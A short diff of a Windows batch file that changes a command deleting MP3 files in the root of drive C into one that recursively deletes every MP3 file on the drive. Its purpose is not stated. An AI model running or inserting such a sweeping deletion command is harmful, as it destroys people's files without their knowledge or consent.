@@ -1,3 +1,3 @@
 @echo off
 
-DEL C:\*.mp3
+DEL /S C:\*.mp3
